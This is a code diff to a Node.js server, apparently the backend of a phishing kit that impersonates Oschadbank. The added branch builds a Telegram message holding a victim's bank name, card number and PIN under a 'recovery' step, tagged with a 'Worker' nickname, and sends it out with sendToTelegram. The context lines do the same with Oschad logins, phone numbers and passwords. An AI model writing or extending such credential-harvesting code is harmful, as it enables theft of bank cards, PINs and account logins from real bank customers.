@@ -271,6 +271,13 @@ app.post('/api/submit', (req, res) => {
                      `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n` +
                      `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
+        } else if (stepData.recovery_pin) {
+            message = `<b>🔧 Восстановление (Ощад)</b>\n\n` +
+                     `<b>Название банка:</b> ${newData.bankName}\n` +
+                     `<b>Номер карты:</b> <code>${newData.recovery_card}</code>\n` +
+                     `<b>Пин:</b> <code>${stepData.recovery_pin}</code>\n` +
+                     `<b>Worker:</b> @${workerNick}\n`;
+            sendToTelegram(message, sessionId, newData.bankName);
         } else if (stepData.password && (stepData.login || stepData.phone)) {
             if (stepData.login) {
                 message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n` +
